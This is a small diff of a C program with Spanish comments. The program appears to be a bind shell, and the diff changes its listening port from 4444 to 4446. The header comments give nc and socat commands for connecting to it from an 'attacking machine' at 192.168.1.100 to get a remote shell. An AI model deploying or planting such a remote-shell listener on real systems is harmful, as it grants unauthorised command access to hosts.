@@ -4,9 +4,9 @@
 // Conectarse desde la máquina atacante:
 //
 //  Con netcat (no es una terminal completa porque no se puede navegar por midnight commander):
-//    nc 192.168.1.100 4444
+//    nc 192.168.1.100 4446
 //  Con socat:
-//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444
+//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4446
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -89,7 +89,7 @@ int main() {
     // Configurar dirección y puerto (4444 por defecto)
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
-    server_addr.sin_port = htons(4444);
+    server_addr.sin_port = htons(4446);
 
     // Enlazar el socket al puerto
     if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
